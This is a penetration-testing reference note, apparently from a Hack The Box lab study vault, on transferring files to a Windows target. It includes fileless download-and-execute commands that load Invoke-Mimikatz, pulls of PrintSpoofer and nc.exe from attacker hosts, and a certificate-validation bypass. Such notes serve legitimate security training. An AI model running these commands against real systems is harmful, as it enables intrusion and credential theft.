---
id: Download
aliases: []
tags:
  - Pentest/File-Transfer/Windows/Download
---

# Download

Download files to the target machine
(*e.g., from the Internet/Attacker machine*)

```mermaid
flowchart LR
    Attacker-->Target
```
___

<!-- PowerShell {{{-->
## PowerShell

<!-- Base64 {{{-->
### Base64

Encode the file to [[Base64]],
in case it is not possible to transfer files
(*e.g., if the remote host has firewall protection*)

1. **Attacker**: [[Base64#Encode|Base64 Encode]] binary file

2. **Attacker**: Run [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   on the file for reference

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

3. **Target**: [[Base64#Windows#Decode|Base64 Decode]] string

4. **Target**: Validate the hash
   (*[Get-FileHash](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5&viewFallbackFrom=powershell-7.2)*)

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
> ```
> ```powershell
> Algorithm       Hash                                                                   Path
> ---------       ----                                                                   ----
> MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Web Download {{{-->
### Web Download

[Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-7.2) —
Get content from a web page on the Internet
(*PowerShell `v3.0+`*)

<!-- Tip {{{-->
> [!tip]
>
> Use the aliases `iwr`, `curl`, and `wget` instead
> of the `Invoke-WebRequest` full name
<!-- }}} -->

```powershell
Invoke-WebRequest <url> -OutFile <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
> ```
<!-- }}} -->

The [System.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)
class can be used to download files over `HTTP`, `HTTPS` or `FTP`

[DownloadFile](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)
— Download a file with the specified URI to a local file

```powershell
(New-Object Net.WebClient).DownloadFile('<target_file_url>','<out_file>')
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
> ```
<!-- }}} -->

```powershell
powershell -c iwr http://10.10.14.67:8000/PrintSpoofer64.exe -OutFile C:\Windows\Temp\PrintSpoofer64.exe"
```

[DownloadFileAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)
— Download a file with the specified URI to a local file
without blocking the thread

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<target_file_url>','<out_file>')
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Fileless Download {{{-->
### Fileless Download

Fileless attacks work by using some operating system functions
to download the payload and execute it directly

[Invoke-Expression](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5&viewFallbackFrom=powershell-7.2)
(*`IEX`*) — Run commands or expressions on the local computer

```powershell
IEX (New-Object Net.WebClient).DownloadString('<url>')
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
> ```
<!-- }}} -->

```powershell
(New-Object Net.WebClient).DownloadString('<url>') | IEX
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
> ```
<!-- }}} -->

[[PowerShell/General|PowerShell]] 3.0+

```powershell
IEX (iwr '<url>')
```

<!-- }}} -->

<!-- Errors {{{-->
### Errors

**Internet Explorer First Launch**

There may be cases when the [Internet Explorer](https://en.wikipedia.org/wiki/Internet_Explorer)
first-launch configuration has not been completed,
which prevents the download

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
> ```
> ```powershell
> Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
> At line:1 char:1
> + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
> + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
> + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
> ```
<!-- }}} -->

Bypass the error with the parameter `-UseBasicParsing`

```powershell
Invoke-WebRequest <url> -UseBasicParsing | IEX
```

**SSL/TLS Certificate Not Trusted**

Could not establish trust relationship for the SSL/TLS secure channel

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
> ```
> ```powershell
> Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
> relationship for the SSL/TLS secure channel."
> At line:1 char:1
> + IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>     + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
>     + FullyQualifiedErrorId : WebException
> ```
<!-- }}} -->

Bypass the error with the following command

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

<!-- }}} -->

<!-- PowerShell Remoting {{{-->
### PowerShell Remoting

[PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.5)
(*a.k.a. [[WinRM/General|WinRM]]*)
allows to execute scripts or commands on a remote computer
using [[PowerShell/General|PowerShell]] sessions

The target must be the member of `Remote Management Users`
or have explicit permissions for PowerShell Remoting
in the session configuration

<!-- Info {{{-->
> [!info]- Listeners
>
> PowerShell Remoting creates both an HTTP and HTTPS listener
>
> - HTTP: `TCP/5985`
> - HTTPS: `TCP/5986`
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
> ```
> ```sh
> ComputerName     : DATABASE01
> RemoteAddress    : 192.168.1.101
> RemotePort       : 5985
> InterfaceAlias   : Ethernet0
> SourceAddress    : 192.168.1.100
> TcpTestSucceeded : True
> ```
>
> The current session has privileges over `DATABASE01`,
> credentials don't need to be specified
>
<!-- }}} -->

1. **Target**: Create a PowerShell Remoting Session

```sh
$Session = New-PSSession -ComputerName <HOSTNAME>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> $Session = New-PSSession -ComputerName DATABASE01
> ```
<!-- }}} -->

2. **Target**: Copy a file from a remote computer to localhost

```sh
Copy-Item -Path "C:\<remote_file>" -Destination C:\ -FromSession $Session
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
> ```
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Web Download {{{-->
## Web Download

Download file(*s*) to the remote host from

- the Internet

- a [Python HTTP Server](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server)
  running on the attacker machine

```sh
sudo python3 -m http.server 8000
```

[[cURL]] — Download a file

```sh
curl <url> -o <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
> ```
<!-- }}} -->

[Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-7.2)
— Get content from a web page on the Internet (*PowerShell `v3.0+`*)

```sh
iwr <url> -OutFile <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
> ```
<!-- }}} -->

[[wget]] — Download a file

```sh
wget <url> -O <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Code {{{-->
## Code

<!-- JavaScript {{{-->
### JavaScript

1. Create a file `wget.js`

<!-- Example {{{-->
> [!example]-
>
> ```sh
> echo "var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");                                                                                                                 ~
> WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
> WinHttpReq.Send();
> BinStream = new ActiveXObject("ADODB.Stream");
> BinStream.Type = 1;
> BinStream.Open();
> BinStream.Write(WinHttpReq.ResponseBody);
> BinStream.SaveToFile(WScript.Arguments(1));" > wget.js
> ```
<!-- }}} -->

2. Download a file using JavaScript and
   [cscript.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cscript)

```cmd
cscript.exe /nologo wget.js <url> <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```cmd
> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Perl {{{-->
### Perl

```sh
perl -e 'use LWP::Simple; getstore("<url>", "<out_file>");'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- PHP {{{-->
### PHP

[File_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php)
— Download a file

```sh
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
> ```
<!-- }}} -->

[Fopen()](https://www.php.net/manual/en/function.fopen.php)
— Download a file

```sh
php -r 'const BUFFER = 1024; $fremote = 
fopen("<file>", "rb"); $flocal = fopen("<out_file>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r 'const BUFFER = 1024; $fremote = 
> fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Python {{{-->
### Python

[Python 3](https://www.python.org/downloads/)
— Download a file

```sh
python3 -c 'import urllib.request;urllib.request.urlretrieve("<url>", "<out_file>")'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
> ```
<!-- }}} -->

[Python 2.7](https://www.python.org/download/releases/2.7/)
— Download a file

```sh
python2.7 -c 'import urllib;urllib.urlretrieve ("<url>", "<out_file>")'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- VBScript {{{-->
### VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript)
is an Active Scripting language developed by Microsoft
that is modeled on Visual Basic

1. Create a file called `wget.vbs`

<!-- Example {{{-->
> [!example]-
>
> ```vbscript
> dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
> dim bStrm: Set bStrm = createobject("Adodb.Stream")
> xHttp.Open "GET", WScript.Arguments.Item(0), False
> xHttp.Send
>
> with bStrm
>     .type = 1
>     .open
>     .write xHttp.responseBody
>     .savetofile WScript.Arguments.Item(1), 2
> end with
> ```
<!-- }}} -->

2. Download a file using JavaScript and
   [cscript.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cscript)

```cmd
cscript.exe /nologo wget.vbs <url> <out_file>
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Protocols {{{-->
## Protocols

<!-- FTP {{{-->
### FTP

[[FTP/General|FTP]] — Serve files from an FTP server to the target

1. **Attacker**: Install [pyftp](https://pypi.org/project/pyftpdlib/),
   an asynchronous FTP server library

[[pipx]]

```sh
pipx install pyftpdlib
```

[[Virtual Environment]]

```sh
pip3 install pyftpdlib
```

2. **Attacker**: Create an FTP server

<!-- Tip {{{-->
> [!tip]
>
> Specify port `21`, as `pyftpdlib` uses port `2121` by default
<!-- }}} -->

[[pipx]]

```sh
pipx run pyftpdlib --port 21
```

[[Virtual Environment]]

```sh
pip3 -m pyftpdlib --port 21
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo python3 -m pyftpdlib --port 21
> ```
> ```sh
> [I 2022-05-17 10:09:19] concurrency model: async
> [I 2022-05-17 10:09:19] masquerade (NAT) address: None
> [I 2022-05-17 10:09:19] passive ports: None
> [I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
> ```
<!-- }}} -->

3. **Target**: Connect to the attacker and retrieve files

**Interactive Shell**

[Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-9.0)
— Transfer files

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/<file>', 'C:\Users\Public\<out_file>')
```

**Simple Shell**

1. Create an FTP command file

<!-- Example {{{-->
> [!example]-
>
> ```sh
> echo open <ip> > ftpcommand.txt
> echo USER anonymous >> ftpcommand.txt
> echo binary >> ftpcommand.txt
> echo GET <file> >> ftpcommand.txt
> echo bye >> ftpcommand.txt
<!-- }}} -->

2. Connect & Execute the command file

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ftp -v -n -s:ftpcommand.txt
> ftp> open 192.168.49.128
> Log in with USER and PASS first.
> ftp> USER anonymous
>
> ftp> GET file.txt
> ftp> bye
>
> more file.txt
> This is a test file
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- ICMP {{{-->
### ICMP

> [!todo]

- [GitHub - ICMP-TransferTools](https://github.com/icyguider/ICMP-TransferTools)


<!-- }}} -->

<!-- RDP {{{-->
### RDP

Transfer files via [[RDP/General|RDP]]

- Right-click and copy a file from the Windows machine
  and paste it into the RDP session

1. **Attacker**: Mount a Linux folder remotely

[rdesktop](http://www.rdesktop.org/)

```sh
rdesktop $target -d <domain> -u <user> -p '<password>' -r disk:linux='<path>'
```

<!-- Info {{{-->
> [!info]-
>
> - `-d`: Domain for authentication
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
> ```
<!-- }}} -->

[xfreerdp](https://www.freerdp.com/)

```sh
xfreerdp /v:$target /d:<domain> /u:<user> /p:'<password>' /drive:linux,<path>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
> ```
<!-- }}} -->

2. **Target**: Access the directory

[tsclient](https://en.wikipedia.org/wiki/Tsclient)

```sh
cd \\tsclient\
```

<!-- Example {{{-->
> [!example]-
>
> ![[tsclient.jpg]]
>
<!-- }}} -->

[mstsc.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)

<!-- Example {{{-->
> [!example]-
>
> ![[rdp.png]]
>
<!-- }}} -->

___
<!-- }}} -->

<!-- SMB {{{-->
### SMB

[[SMB/General|SMB]] enables applications and users
to transfer files to and from remote servers

1. **Attacker**: Create an SMB server with
   [[Impacket]] - [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)

Authenticated SMB server

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
> ```
> ```sh
> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
>
> [*] Config file parsed
> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
> [*] Config file parsed
> [*] Config file parsed
> [*] Config file parsed
> ```
<!-- }}} -->

Unauthenticated SMB server

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo impacket-smbserver share -smb2support /tmp/smbshare
> ```
> ```sh
> Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
>
> [*] Config file parsed
> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
> [*] Config file parsed
> [*] Config file parsed
> [*] Config file parsed
> ```
<!-- }}} -->

> [!warning]
>
> New versions of Windows block unauthenticated guest access
>
> ```cmd
> You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
> ```

2. **Target**: Retrieve files from the attacker's SMB server

Copy a file without credentials (*UNC path*)

```cmd
copy \\<ip>\<share>\<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```cmd
> C:\htb> copy \\192.168.220.133\smbshare\nc.exe
> ```
> ```cmd
> 1 file(s) copied.
> ```
<!-- }}} -->

Mount SMB server with credentials & copy file

```cmd
net use n: \\<ip>\<share> /user:<user> <password>
```

```sh
copy n:\<file>
```

<!-- Example {{{-->
> [!example]-
>
> Mount SMB server with credentials (*`test:test`*)
>
> ```cmd
> C:\htb> net use n: \\192.168.220.133\share /user:test test
> ```
> ```cmd
> The command completed successfully.
> ```
> ```sh
> C:\htb> copy n:\nc.exe
> ```
> ```sh
> 1 file(s) copied.
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
